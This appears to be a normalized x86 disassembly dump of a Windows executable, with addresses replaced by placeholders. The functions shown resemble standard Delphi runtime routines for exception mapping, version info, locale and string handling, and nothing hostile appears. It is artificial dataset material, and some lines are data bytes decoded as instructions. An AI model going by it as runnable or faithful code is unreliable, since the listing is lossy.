pop ecx
mov [ fs : eax ] edx
push sub_40afed
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f90
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408484
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40be8c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_40448c
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404234
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403fc0
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx sub_40b010
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408484
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404234
inc ebx
jmp r-xdata
mov eax esi
call sub_40422c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408484
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404234
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404234
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404234
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404154
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404234
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404154
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404234
sub_40b050
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b044
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c054
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4083a8
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404fd8
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403184
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4089e0
mov eax [ ebp - 0x4 ]
call sub_408344
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_40442c
mov ebx eax
mov eax ebx
call sub_408344
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b1d8
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b050
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404fd8
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402acc
call sub_402824
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408344
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b2a0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403fc0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40b2dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408a20
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b33d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
add esp 0xfffffff0
call sub_403540
sub_40b33d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40b35c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405a6c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40b398
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405a6c
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408a20
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b40b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
add esp 0xfffffff0
call sub_403540
sub_40b40b
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40b458
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402898
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b4b8
mov esp 0xe0040b4
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_4039a8
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b2a0
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b458
mov edx eax
sub_40b52c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404004
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b5cf
lea eax [ ebp - 0x20 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40b61c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b6b4
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4041dc
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408214
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b876
lea eax [ ebp - 0x170 ]
call sub_403f6c
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40b880
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b61c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b2a0
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push ebp
call sub_40b6b4
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b942
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
mov ebx eax
sub_40b95c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40b94c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b69c
mov eax [ rw-data ]
mov [ eax ] sub_40b880
mov eax sub_40b5e8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b604
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40b9e0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403234
xor eax eax
mov [ rw-data ] eax
sub_40ba60
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4041dc
sub_40baf0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404004
lea eax [ ebp - 0x8 ]
call j_sub_404438#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40442c
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bbcd
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax ebx
call sub_4026bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40442c
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bbdc
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bc54
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_40442c
mov edx esi
dec edx
call sub_40bbdc
sub_40bc90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40422c
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40bcb8
pop esi
pop ebx
retn
mov eax ebx
call sub_40422c
mov esi eax
sub_40bcb8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40422c
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40bec8
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40bd10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_40422c
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40bec8
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40bec8
dec eax
mov ebx eax
sub_40bda0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40422c
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40bd10
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_40422c
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40be04
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40422c
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_40422c
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40bd10
mov eax esi
call sub_40422c
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_40422c
mov [ esp ] eax
jmp r-xdata
sub_40be8c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_40442c
add eax esi
dec eax
call sub_40be64
sub_40bec8
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_40442c
add eax ebx
dec eax
call sub_40be64
add eax ebx
sub_40bf04
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_40422c
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bc54
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40bf38
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40422c
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40bc54
test al al
jne r-xdata
mov eax ebp
call sub_40442c
mov dl [ esi + edi - 0x1 ]
call sub_4084c8
test eax eax
setne bl
sub_40bf7c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_40442c
push eax
mov eax esi
call sub_40442c
mov ebp eax
mov eax ebp
pop edx
call sub_40bfb4
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40bfb4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408344
mov [ esp ] eax
mov eax ebp
call sub_408344
mov edi eax
mov edx ebp
mov eax esi
call sub_4084dc
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40bc78
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_4084dc
mov ebx eax
inc ebx
sub_40c054
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c07c
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c07c
test eax eax
jne r-xdata
sub_40c07c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4084c8
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40bc78
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_4084c8
mov edi eax
test edi edi
jne r-xdata
sub_40c0bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4041dc
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_407e8c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c127
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_40c130
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c0bc
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c1a8
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c190
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c130
pop ecx
push ebp
call sub_40c130
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402d64
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
